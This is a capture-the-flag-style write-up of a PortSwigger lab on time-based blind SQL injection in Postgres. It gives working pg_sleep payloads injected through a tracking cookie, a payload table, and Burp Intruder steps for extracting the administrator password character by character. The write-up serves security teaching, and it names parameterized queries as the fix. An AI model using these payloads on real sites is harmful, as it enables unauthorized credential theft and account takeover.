# Blind SQL Injection with Time Delays and Information Retrieval

**Lab:** Blind SQL injection with time delays and information retrieval
**Status:** Solved ✅

---

## What this one's testing

This lab is basically the previous conditional-response lab's harder sibling. Same idea — a `TrackingId` cookie feeds into a backend query, and the app never shows us the query results directly — but this time there's no visible difference in the response either. No extra content, no error, nothing to compare side by side.

What we *do* have is a query that runs synchronously. So if we can make the database pause on command, that pause is the only signal we're going to get — and it turns out that's more than enough.

**Goal:** use time delays to confirm the `administrator` account exists, work out how long their password is, then pull it out character by character and log in.

## The core trick: CASE + pg_sleep

The database behind this lab is Postgres, so the payload leans on `CASE WHEN ... THEN ... ELSE ... END` combined with `pg_sleep()`:

```sql
SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END
```

If the condition is true, the database sleeps for 10 seconds before responding. If it's false, it sleeps for 0 seconds — effectively no delay. That's our boolean oracle: slow response means true, fast response means false.

## Working through it

**1. Grab the request**

Hit the shop's front page, catch the request in Burp, and find the `TrackingId` cookie. That's our injection point, same as the other cookie-based labs in this series.

**2. Confirm a TRUE condition causes a delay**

Set the cookie to:

```
x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

`1=1` is always true, so the response should take about 10 seconds to come back. If it does, we've confirmed the injection works and that we can control timing.

**3. Confirm a FALSE condition doesn't**

Now flip it:

```
x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

`1=2` is false, so this one should come back immediately. Between steps 2 and 3 we've now got a reliable true/false channel with nothing visible in the response — purely based on how long the server makes us wait.

**4. Confirm the administrator account exists**

Swap the hardcoded condition for a real one:

```
x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

A 10-second delay here confirms there's a row in `users` where `username = 'administrator'`.

**5. Start narrowing down the password length**

```
x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

That should delay, confirming the password's longer than 1 character. From here it's just a matter of walking the number up:

```
...LENGTH(password)>2...
...LENGTH(password)>3...
```

and so on, by hand in Repeater, until the delay stops happening. Whatever number you were testing right before it flipped to "no delay" is the actual password length. In this lab it comes out to 20 characters — short enough that doing it manually in Repeater is fine.

**6. Switch to Intruder for character extraction**

This is where doing it by hand stops being realistic. Confirming the password's length only took a handful of requests; pulling out 20 individual characters, each one potentially requiring dozens of guesses, means hundreds of requests — so send the request over to Burp Intruder instead.

The base payload uses `SUBSTRING()` to isolate one character at a time and test it against a guess:

```
x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

**7. Mark the payload position**

In Intruder, highlight just the `a` in that `SUBSTRING(...)='a'` comparison and mark it as a payload position, so the cookie value looks like:

```
...SUBSTRING(password,1,1)='§a§')...
```

That's the one character Intruder will cycle through on each request.

**8. Load up the character set**

Under Payloads, use a simple list and load in lowercase letters a–z plus digits 0–9 — Burp's "Add from list" presets make this quick. That covers the alphabet the lab's password is built from.

**9. Force single-threaded requests**

This part actually matters a lot: time-based attacks fall apart if requests overlap, because concurrent `pg_sleep()` calls can distort your timing measurements. In the Resource Pool tab, cap **Maximum concurrent requests** at 1 so every request runs and completes before the next one fires.

**10. Run the attack and read the clock, not the content**

Launch it. In the results table, watch the **Response received** column — most rows will show a small number (fast, normal response), but exactly one row should show something in the neighborhood of 10,000 ms. Whichever character was in that row's payload is the correct character at that position.

**11. Repeat for every position**

Go back to the request, bump the offset in `SUBSTRING(password, 1, 1)` up to `2`, then `3`, and so on:

```
...SUBSTRING(password,2,1)='§a§')...
```

Rerun the Intruder attack at each offset, note the slow row each time, and keep going until you've worked through all 20 positions. String the characters together in order and you've got the full password.

**12. Log in**

Head to the login page and sign in as `administrator` with the password you just reconstructed one character at a time.

## Why this works even with zero visible feedback

Every blind SQLi technique needs *some* side channel to leak a true/false answer through, since the app itself gives nothing away. In the conditional-response version of this attack, that channel was a difference in page content. Here, there's no content difference at all — so we manufacture a difference in *time* instead, using `pg_sleep()` gated behind a `CASE WHEN`. As long as the query executes synchronously (which it does — the server has to wait for the query to finish before it can respond), a deliberate delay is just as reliable a signal as any visible change would be. It's slower to exploit, but it works even when the app is otherwise a black box.

## Payload reference

| Purpose | Payload |
|---|---|
| Confirm TRUE causes a delay | `x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| Confirm FALSE causes no delay | `x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
| Confirm admin account exists | `x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` |
| Test password length | `x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` |
| Test a specific character | `x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,POS,1)='CHAR') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` |

## Tools used

- Burp Suite (Proxy + Repeater + Intruder)
- Browser

## Takeaways

- When an app gives you *zero* visible feedback — no errors, no content changes — response timing can still be a fully reliable side channel, as long as the query runs synchronously.
- `CASE WHEN ... THEN pg_sleep(N) ELSE pg_sleep(0) END` is the Postgres pattern for turning any boolean condition into a measurable delay.
- Manual testing (Repeater) is fine for coarse checks like password length, but full character extraction needs automation — that's what Intruder is for.
- Concurrency will wreck timing-based attacks. Cap Intruder to one request at a time or your delay measurements stop meaning anything.
- The fix is the same as every other SQLi lab in this series: parameterized queries. Time-based blind injection doesn't need visible output, so filtering error messages or hiding content won't save you — only actually stopping the injection does.

---

*Solved as part of the PortSwigger Web Security Academy — for learning/authorized testing only. Don't run this against anything you don't have permission to test.*
